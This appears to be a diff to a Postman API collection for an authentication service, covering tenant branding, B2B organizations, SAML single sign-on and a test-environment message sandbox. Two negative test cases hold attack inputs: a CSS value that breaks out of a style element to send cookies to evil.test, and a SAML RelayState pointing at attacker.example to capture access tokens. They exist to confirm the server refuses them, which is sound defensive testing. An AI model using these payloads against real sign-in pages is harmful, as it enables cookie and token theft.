+								"value": "{{secretKey}}"
+							}
+						],
+						"url": {
+							"raw": "{{baseUrl}}/v1/tenant/branding",
+							"host": ["{{baseUrl}}"],
+							"path": ["v1", "tenant", "branding"]
+						},
+						"description": "Reads the stored branding behind the bootstrap document. The tenant is taken from the credential, so no target may be named."
+					}
+				},
+				{
+					"name": "Update Tenant Branding",
+					"request": {
+						"method": "PUT",
+						"header": [
+							{
+								"key": "Content-Type",
+								"value": "application/json"
+							},
+							{
+								"key": "X-Authn-Secret-Key",
+								"value": "{{secretKey}}"
+							}
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "{\n  \"app_name\": \"Acme Identity\",\n  \"logo_url\": \"https://cdn.acme.example/logo.svg\",\n  \"logo_dark_url\": \"https://cdn.acme.example/logo-dark.svg\",\n  \"favicon_url\": \"https://cdn.acme.example/favicon.ico\",\n  \"primary_color\": \"#1a73e8\",\n  \"background_color\": \"#ffffff\",\n  \"text_color\": \"#0f172a\",\n  \"button_text_color\": \"#ffffff\",\n  \"font_family\": \"Inter, -apple-system, sans-serif\",\n  \"support_url\": \"https://acme.example/support\",\n  \"terms_url\": \"https://acme.example/terms\",\n  \"privacy_url\": \"https://acme.example/privacy\",\n  \"custom_css\": \".authn-card { border-radius: 12px }\"\n}"
+						},
+						"url": {
+							"raw": "{{baseUrl}}/v1/tenant/branding",
+							"host": ["{{baseUrl}}"],
+							"path": ["v1", "tenant", "branding"]
+						},
+						"description": "Replaces the tenant's branding wholesale — a merge would make clearing a logo impossible. Every field may be empty. Colours must be hex, URLs must be http(s), and a value that could escape a CSS declaration or the enclosing <style> element is refused with 400 naming the field, since branding renders on the page where a user types their password. A publishable key is refused here."
+					}
+				},
+				{
+					"name": "Update Tenant Branding — Style Breakout (Expect 400)",
+					"request": {
+						"method": "PUT",
+						"header": [
+							{
+								"key": "Content-Type",
+								"value": "application/json"
+							},
+							{
+								"key": "X-Authn-Secret-Key",
+								"value": "{{secretKey}}"
+							}
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "{\n  \"custom_css\": \"body{}</style><script>fetch('//evil.test?c='+document.cookie)</script>\"\n}"
+						},
+						"url": {
+							"raw": "{{baseUrl}}/v1/tenant/branding",
+							"host": ["{{baseUrl}}"],
+							"path": ["v1", "tenant", "branding"]
+						},
+						"description": "Negative case. The payload closes the <style> element the stylesheet is delivered in and would execute on every sign-in page the tenant serves. Expect 400 with code validation_failed, naming custom_css."
+					}
+				}
+			]
+		},
+		{
 			"name": "B2B Organizations & Team Invitations (FR-15)",
 			"item": [
 				{
@@ -2799,7 +3044,7 @@
 					"request": {
 						"method": "POST",
 						"header": [
-							{ "key": "X-Publishable-Key", "value": "{{publishableKey}}" },
+							{ "key": "X-Authn-Publishable-Key", "value": "{{publishableKey}}" },
 							{ "key": "Content-Type", "value": "application/json" }
 						],
 						"body": {
@@ -2811,7 +3056,7 @@
 							"host": ["{{baseUrl}}"],
 							"path": ["v1", "client", "organizations"]
 						},
-						"description": "Creates a new B2B Organization workspace and auto-assigns creator as org_admin."
+						"description": "Creates a new B2B Organization workspace and auto-assigns creator as org_admin. The workspace lands in the environment of the presented key and the response echoes it; a test key past TEST_MAX_ORGANIZATIONS answers 403 test_quota_exceeded."
 					}
 				},
 				{
@@ -2819,7 +3064,7 @@
 					"request": {
 						"method": "GET",
 						"header": [
-							{ "key": "X-Publishable-Key", "value": "{{publishableKey}}" }
+							{ "key": "X-Authn-Publishable-Key", "value": "{{publishableKey}}" }
 						],
 						"url": {
 							"raw": "{{baseUrl}}/v1/client/organizations",
@@ -2834,7 +3079,7 @@
 					"request": {
 						"method": "GET",
 						"header": [
-							{ "key": "X-Publishable-Key", "value": "{{publishableKey}}" }
+							{ "key": "X-Authn-Publishable-Key", "value": "{{publishableKey}}" }
 						],
 						"url": {
 							"raw": "{{baseUrl}}/v1/client/organizations/{{orgId}}",
@@ -2849,7 +3094,7 @@
 					"request": {
 						"method": "GET",
 						"header": [
-							{ "key": "X-Publishable-Key", "value": "{{publishableKey}}" }
+							{ "key": "X-Authn-Publishable-Key", "value": "{{publishableKey}}" }
 						],
 						"url": {
 							"raw": "{{baseUrl}}/v1/client/organizations/{{orgId}}/members",
@@ -2864,7 +3109,7 @@
 					"request": {
 						"method": "POST",
 						"header": [
-							{ "key": "X-Publishable-Key", "value": "{{publishableKey}}" },
+							{ "key": "X-Authn-Publishable-Key", "value": "{{publishableKey}}" },
 							{ "key": "Content-Type", "value": "application/json" }
 						],
 						"body": {
@@ -2884,7 +3129,7 @@
 					"request": {
 						"method": "POST",
 						"header": [
-							{ "key": "X-Publishable-Key", "value": "{{publishableKey}}" },
+							{ "key": "X-Authn-Publishable-Key", "value": "{{publishableKey}}" },
 							{ "key": "Content-Type", "value": "application/json" }
 						],
 						"body": {
@@ -2910,19 +3155,19 @@
 					"request": {
 						"method": "POST",
 						"header": [
-							{ "key": "X-Publishable-Key", "value": "{{publishableKey}}" },
+							{ "key": "X-Authn-Publishable-Key", "value": "{{publishableKey}}" },
 							{ "key": "Content-Type", "value": "application/json" }
 						],
 						"body": {
 							"mode": "raw",
-							"raw": "{\n  \"idp_entity_id\": \"http://www.okta.com/exk123\",\n  \"idp_sso_url\": \"https://siemens.okta.com/app/sso/saml\",\n  \"idp_certificate\": \"-----BEGIN CERTIFICATE-----\\nMIIDXTCC...\\n-----END CERTIFICATE-----\",\n  \"allowed_domains\": [\"siemens.com\", \"siemens.de\"],\n  \"enforce_sso\": true\n}"
+							"raw": "{\n  \"idp_entity_id\": \"http://www.okta.com/exk123\",\n  \"idp_sso_url\": \"https://siemens.okta.com/app/sso/saml\",\n  \"idp_certificate\": \"-----BEGIN CERTIFICATE-----\\nMIIDXTCC...\\n-----END CERTIFICATE-----\",\n  \"allowed_domains\": [\"siemens.com\", \"siemens.de\"],\n  \"enforce_sso\": true,\n  \"environment\": \"test\"\n}"
 						},
 						"url": {
 							"raw": "{{baseUrl}}/v1/client/organizations/{{orgId}}/saml",
 							"host": ["{{baseUrl}}"],
 							"path": ["v1", "client", "organizations", "{{orgId}}", "saml"]
 						},
-						"description": "Configures SAML 2.0 Identity Provider settings and domain SSO enforcement for an organization."
+						"description": "Configures SAML 2.0 Identity Provider settings and domain SSO enforcement for an organization. environment is test here so the request runs against the demo credentials. A connection in live is what an organization's real employees sign in through, so naming live — or omitting the field, whose default is live — takes a live key and is otherwise refused 403 live_key_required."
 					}
 				},
 				{
@@ -2930,7 +3175,7 @@
 					"request": {
 						"method": "POST",
 						"header": [
-							{ "key": "X-Publishable-Key", "value": "{{publishableKey}}" },
+							{ "key": "X-Authn-Publishable-Key", "value": "{{publishableKey}}" },
 							{ "key": "Content-Type", "value": "application/json" }
 						],
 						"body": {
@@ -2955,6 +3200,212 @@
 							"path": ["v1", "saml", "metadata", "{{orgId}}"]
 						},
 						"description": "Generates Service Provider XML metadata document for Okta / Azure AD import."
+					}
+				},
+				{
+					"name": "ACS — Resume to Registered Destination (302)",
+					"request": {
+						"method": "POST",
+						"header": [{ "key": "Content-Type", "value": "application/x-www-form-urlencoded" }],
+						"body": {
+							"mode": "urlencoded",
+							"urlencoded": [
+								{ "key": "SAMLResponse", "value": "{{samlResponseBase64}}", "type": "text" },
+								{ "key": "RelayState", "value": "{{samlRelayState}}", "type": "text" }
+							]
+						},
+						"url": {
+							"raw": "{{baseUrl}}/v1/saml/acs",
+							"host": ["{{baseUrl}}"],
+							"path": ["v1", "saml", "acs"]
+						},
+						"description": "Assertion Consumer Service. Unauthenticated by protocol necessity — the identity provider holds no Authn key — so no publishable key is sent; the tenant is derived from the assertion Issuer and the protection is XML signature validation.\n\nSet samlRelayState to a URL registered in exact_redirect_uris on one of the tenant's applications. The response is 302 with the access token in the Location fragment and the refresh token in an HttpOnly cookie.\n\nTurn OFF 'Automatically follow redirects' in Postman settings, or Postman will follow the Location and show you the landing page instead of the header you are trying to inspect.\n\nNote that an assertion is single-use: replaying the same samlResponseBase64 returns 403."
+					}
+				},
+				{
+					"name": "ACS — Unregistered Destination Is Refused (200)",
+					"request": {
+						"method": "POST",
+						"header": [{ "key": "Content-Type", "value": "application/x-www-form-urlencoded" }],
+						"body": {
+							"mode": "urlencoded",
+							"urlencoded": [
+								{ "key": "SAMLResponse", "value": "{{samlResponseBase64}}", "type": "text" },
+								{ "key": "RelayState", "value": "https://attacker.example/collect", "type": "text" }
+							]
+						},
+						"url": {
+							"raw": "{{baseUrl}}/v1/saml/acs",
+							"host": ["{{baseUrl}}"],
+							"path": ["v1", "saml", "acs"]
+						},
+						"description": "Same assertion, with a RelayState the tenant never registered. Anyone can craft a link to an identity provider's SSO URL carrying any RelayState, and the provider echoes it back here — so an unchecked value would hand a real employee's access token to whoever chose the URL.\n\nExpect 200 with the token in the body and NO Location header. The sign-in still succeeds: the assertion has already been consumed and is single-use, so refusing would cost the user an authentication they cannot retry. The refusal is logged server-side as '[SAML] relay state refused for tenant ...'."
+					}
+				}
+			]
+		},
+		{
+			"name": "Test-Environment Sandbox Inbox & Delivery Verification (FR-18)",
+			"item": [
+				{
+					"name": "List Captured Messages",
+					"request": {
+						"method": "GET",
+						"header": [
+							{ "key": "Authorization", "value": "Bearer {{secretKey}}" }
+						],
+						"url": {
+							"raw": "{{baseUrl}}/v1/tenant/sandbox/messages",
+							"host": ["{{baseUrl}}"],
+							"path": ["v1", "tenant", "sandbox", "messages"]
+						},
+						"description": "Every email and SMS the test environment produced, newest first, instead of sending them. Interception happens at the provider interface, so all seven send sites — signup verification, password reset, magic link, email-change confirmation, OTP, MFA codes and invitations — land here without any of them knowing.\n\nThe listing omits the rendered body but keeps the fields a harness reads: 'code' carries the extracted one-time code and 'metadata.link' the action URL, both pulled out at capture time.\n\nVerified response (200):\n{\"environment\":\"test\",\"total\":1,\"messages\":[{\"id\":\"sbm_...\",\"channel\":\"email\",\"environment\":\"test\",\"recipient\":\"user@example.com\",\"subject\":\"Verify your email\",\"template\":\"email_verification\",\"metadata\":{\"link\":\"http://localhost:3000/verify?token=...\"},\"created_at\":\"2026-08-19T10:00:00Z\"}]}"
+					}
+				},
+				{
+					"name": "List Captured Messages — Filtered",
+					"request": {
+						"method": "GET",
+						"header": [
+							{ "key": "Authorization", "value": "Bearer {{secretKey}}" }
+						],
+						"url": {
+							"raw": "{{baseUrl}}/v1/tenant/sandbox/messages?recipient={{userEmail}}&channel=email&limit=5&offset=0",
+							"host": ["{{baseUrl}}"],
+							"path": ["v1", "tenant", "sandbox", "messages"],
+							"query": [
+								{ "key": "recipient", "value": "{{userEmail}}" },
+								{ "key": "channel", "value": "email" },
+								{ "key": "limit", "value": "5" },
+								{ "key": "offset", "value": "0" }
+							]
+						},
+						"description": "Narrows the inbox to one recipient and channel, which is how a test finds its own message when a suite runs several flows against the same tenant. 'total' is the count matching the filter rather than the page size, so a harness can tell 'my message has not arrived yet' from 'I am looking at the wrong page'.\n\n'channel' accepts only 'email' or 'sms'; anything else is 400 with code VALIDATION_FAILED. 'limit' and 'offset' must parse as integers."
+					}
+				},
+				{
+					"name": "Read One Captured Message",
+					"request": {
+						"method": "GET",
+						"header": [
+							{ "key": "Authorization", "value": "Bearer {{secretKey}}" }
+						],
+						"url": {
+							"raw": "{{baseUrl}}/v1/tenant/sandbox/messages/{{sandboxMessageId}}",
+							"host": ["{{baseUrl}}"],
+							"path": ["v1", "tenant", "sandbox", "messages", "{{sandboxMessageId}}"]
+						},
+						"description": "Reads one capture including 'body', the fully rendered document — the only place it is returned, because a listing carrying every rendered template would be tens of times larger than the fields anyone pages through it for.\n\nSet {{sandboxMessageId}} from an 'id' in the listing above. An id belonging to another tenant is 404, not 403: the store is scoped to the calling tenant, so an unknown id and somebody else's id are indistinguishable from inside, and answering 403 would confirm the row exists."
+					}
+				},
+				{
+					"name": "Empty The Sandbox Inbox",
+					"request": {
+						"method": "DELETE",
+						"header": [
+							{ "key": "Authorization", "value": "Bearer {{secretKey}}" }
+						],
+						"url": {
+							"raw": "{{baseUrl}}/v1/tenant/sandbox/messages",
+							"host": ["{{baseUrl}}"],
+							"path": ["v1", "tenant", "sandbox", "messages"]
+						},
+						"description": "Deletes the calling tenant's captures and reports how many went. Run it between suites so a test can assert on 'the newest message' without the previous run's captures standing in front of it.\n\nCaptures also expire on their own: the retention sweeper removes anything older than SANDBOX_MESSAGE_RETENTION (24h by default), because these bodies hold working verification links and one-time codes in plain text.\n\nVerified response (200):\n{\"message\":\"sandbox inbox emptied\",\"environment\":\"test\",\"removed\":3}"
+					}
+				},
+				{
+					"name": "List Captured Messages With A Live Key (expect 403)",
+					"request": {
+						"method": "GET",
+						"header": [
+							{ "key": "Authorization", "value": "Bearer {{liveSecretKey}}" }
+						],
+						"url": {
+							"raw": "{{baseUrl}}/v1/tenant/sandbox/messages",
+							"host": ["{{baseUrl}}"],
+							"path": ["v1", "tenant", "sandbox", "messages"]
+						},
+						"description": "A live credential is refused rather than answered with an empty list. Nothing is ever captured outside test, so an empty list would be a true answer to the wrong question, and 'my message is missing' is a far worse conclusion to leave an operator with than 'you are looking at the wrong environment'.\n\nExpect 403 with code FORBIDDEN and a message naming the environment the credential addresses. Requires {{liveSecretKey}} to be set to an sk_live_ key."
+					}
+				},
+				{
+					"name": "Verify Email Delivery Through The Configured Provider",
+					"request": {
+						"method": "POST",
+						"header": [
+							{ "key": "Content-Type", "value": "application/json" },
+							{ "key": "Authorization", "value": "Bearer {{consoleAdminToken}}" }
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "{\n  \"channel\": \"email\"\n}"
+						},
+						"url": {
+							"raw": "{{baseUrl}}/v1/tenant/delivery/verify",
+							"host": ["{{baseUrl}}"],
+							"path": ["v1", "tenant", "delivery", "verify"]
+						},
+						"description": "Sends one real message through the configured provider, deliberately bypassing the sandbox. That bypass is the entire point: a captured message never reaches a provider, so no amount of sandbox traffic establishes that the SMTP or API credentials in configuration actually work. Sending is the only test of a send.\n\nThere is no recipient field. The address is the signed-in operator's own, which makes it impossible to aim the endpoint at somebody else rather than merely against the rules. An operator whose own email is unverified is refused with 403 EMAIL_VERIFICATION_REQUIRED before anything is sent.\n\n{{consoleAdminToken}} must be a console JWT carrying the tenant_admin role. The response names the driver that answered, so the result cannot be misread as coming from a backend you are not looking at.\n\nVerified response (200):\n{\"message\":\"delivery test accepted by the provider\",\"channel\":\"email\",\"recipient\":\"admin@example.com\",\"driver\":\"smtp\"}\n\nA provider that rejects the message is 502; no provider configured at all is 503."
+					}
+				},
+				{
+					"name": "Verify SMS Delivery Through The Configured Provider",
+					"request": {
+						"method": "POST",
+						"header": [
+							{ "key": "Content-Type", "value": "application/json" },
+							{ "key": "Authorization", "value": "Bearer {{consoleAdminToken}}" }
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "{\n  \"channel\": \"sms\"\n}"
+						},
+						"url": {
+							"raw": "{{baseUrl}}/v1/tenant/delivery/verify",
+							"host": ["{{baseUrl}}"],
+							"path": ["v1", "tenant", "delivery", "verify"]
+						},
+						"description": "The SMS half of the same check, sent to the operator's own verified phone number. An account with no phone number, or one that is present but unverified, is 403 — an unverified number is somebody else's until it is proven, and text messages cost money to strangers.\n\nBoth channels share a cap of three verifications per tenant per rate-limit window; a fourth is 429 with Retry-After in seconds. The provider's answer does not change between attempts, so repeating the call only spends quota."
+					}
+				},
+				{
+					"name": "Verify Delivery With A Secret Key (expect 403)",
+					"request": {
+						"method": "POST",
+						"header": [
+							{ "key": "Content-Type", "value": "application/json" },
+							{ "key": "Authorization", "value": "Bearer {{secretKey}}" }
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "{\n  \"channel\": \"email\"\n}"
+						},
+						"url": {
+							"raw": "{{baseUrl}}/v1/tenant/delivery/verify",
+							"host": ["{{baseUrl}}"],
+							"path": ["v1", "tenant", "delivery", "verify"]
+						},
+						"description": "A secret key authenticates the endpoint but cannot use it. The key identifies an application rather than a person, so there is no address behind it that the engine has watched anybody prove control of — and requiring the console credential is what keeps the recipient something the engine already knows instead of something the caller supplies.\n\nExpect 403 with code FORBIDDEN. This is the mirror image of the inbox: the inbox is test-only and takes a secret key, delivery verification is console-only and works in either environment."
+					}
+				},
+				{
+					"name": "Verify Delivery With An Unknown Channel (expect 400)",
+					"request": {
+						"method": "POST",
+						"header": [
+							{ "key": "Content-Type", "value": "application/json" },
+							{ "key": "Authorization", "value": "Bearer {{consoleAdminToken}}" }
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "{\n  \"channel\": \"fax\"\n}"
+						},
+						"url": {
+							"raw": "{{baseUrl}}/v1/tenant/delivery/verify",
+							"host": ["{{baseUrl}}"],
+							"path": ["v1", "tenant", "delivery", "verify"]
+						},
+						"description": "The channel is validated before the operator is looked up or any quota is spent, so a typo costs nothing and leaks nothing about the account.\n\nExpect 400 with code VALIDATION_FAILED and the message \"channel must be 'email' or 'sms'\"."
 					}
 				}
 			]
